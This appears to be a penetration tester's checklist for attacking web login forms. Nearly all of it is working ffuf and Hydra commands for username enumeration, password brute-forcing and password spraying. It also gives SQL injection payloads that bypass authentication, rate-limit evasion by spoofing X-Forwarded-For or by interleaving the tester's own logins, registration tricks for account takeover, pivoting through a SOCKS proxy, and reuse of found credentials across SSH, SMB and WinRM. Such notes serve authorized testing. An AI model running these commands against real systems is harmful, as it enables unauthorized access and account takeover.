# Login forms

## Before guessing
- [ ] One failed login through Burp: THE-PAGE it posts to, <UserField> and <PassField>, any CSRF token, and THE-FAILURE, the text a failure shows
- [ ] Default credentials for the product: admin:admin, and the vendor's documentation
- [ ] SQL injection in both fields: admin'-- - and ' OR 1=1 LIMIT 1-- -, then :Pb sqli
- [ ] The password reset and registration pages, and the calls the page makes in the background, from F12 and Network
- [ ] The lockout threshold, before anything below
- [ ] A success usually answers 302 with a new Set-Cookie: when every failure is 200, -fc 200 in ffuf

## Usernames
A real user gets a different message, size or delay:
ffuf -c -u <Scheme>://<WebHost>/THE-PAGE -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d '<UserField>=FUZZ&<PassField>=x' -w /usr/share/seclists/Usernames/Names/names.txt -ac
- [ ] The reset page and the registration page give users away too: user not found, or already taken

## Passwords with ffuf
ffuf -c -u <Scheme>://<WebHost>/THE-PAGE -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d '<UserField>=<TargetUser>&<PassField>=FUZZ' -w /usr/share/wordlists/rockyou.txt -fr 'THE-FAILURE' -t 50
A form that wants a session cookie first:
ffuf -c -u <Scheme>://<WebHost>/THE-PAGE -X POST -H 'Content-Type: application/x-www-form-urlencoded' -b 'THE-COOKIE' -d '<UserField>=<TargetUser>&<PassField>=FUZZ' -w /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -fr 'THE-FAILURE'

## Passwords with Hydra
The form string is the page, the body with ^USER^ and ^PASS^, then F= and the failure text, split by colons.
hydra -l '<TargetUser>' -P /usr/share/wordlists/rockyou.txt -s <Port> <TargetIP> http-post-form '/THE-PAGE:<UserField>=^USER^&<PassField>=^PASS^:F=THE-FAILURE' -e nsr -f -t 16
A list of users, each password tried on all of them before the next:
hydra -L users.txt -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -s <Port> <TargetIP> http-post-form '/THE-PAGE:<UserField>=^USER^&<PassField>=^PASS^:F=THE-FAILURE' -u -f -t 16
- [ ] HTTPS: https-post-form in place of http-post-form
- [ ] A site reached by name: the name in place of <TargetIP>, added first with host add at the pwn-broker prompt
- [ ] A cookie the form needs: :H=Cookie\: THE-COOKIE on the end of the form string, the colon escaped
- [ ] Only success shows a change: S=THE-SUCCESS in place of F=THE-FAILURE
WordPress, where the fields are log and pwd:
hydra -l '<TargetUser>' -P /usr/share/wordlists/rockyou.txt -s <Port> <TargetIP> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect' -f -t 16
HTTP basic auth, the browser's own login box:
hydra -l '<TargetUser>' -P /usr/share/wordlists/rockyou.txt -s <Port> <TargetIP> http-get /THE-PAGE -f

## Past a rate limit
A new client address with every guess:
seq 1 254 | sed 's/^/127.0.0./' > ips.txt
ffuf -c -u <Scheme>://<WebHost>/THE-PAGE -X POST -H 'Content-Type: application/x-www-form-urlencoded' -H 'X-Forwarded-For: IP' -d '<UserField>=<TargetUser>&<PassField>=PASS' -w ips.txt:IP -w /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt:PASS -mode pitchfork -fr 'THE-FAILURE'
- [ ] Pitchfork stops at the shorter list: 254 guesses per run
A counter that resets on a good login: my own login, <Username> and <Password>, after every two guesses.
awk '{print "<TargetUser>"; if (NR%2==0) print "<Username>"}' /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt > users-mix.txt
awk '{print; if (NR%2==0) print "<Password>"}' /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt > pass-mix.txt
ffuf -c -u <Scheme>://<WebHost>/THE-PAGE -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d '<UserField>=U&<PassField>=P' -w users-mix.txt:U -w pass-mix.txt:P -mode pitchfork -fr 'THE-FAILURE'
- [ ] My own logins show up as hits: the others are the find
- [ ] Still blocked: %0d or a space after the username, which the limit may count as a new account

## Registration
- [ ] Registering allowed: an account named like <TargetUser> with a capital, a space after it, or %00 after it, then my password tried as the real one

## Tokens and spraying
- [ ] A fresh CSRF token on every try: a Burp session rule with a macro that loads the login page first, then Intruder
- [ ] A domain-backed login, OWA or a VPN portal: one password across many users, under the lockout threshold
- [ ] Through a pivot: -x socks5://127.0.0.1:1080 in ffuf, proxychains -q in front of hydra
- [ ] A login found: tried on SSH, SMB, WinRM and every other login on the box
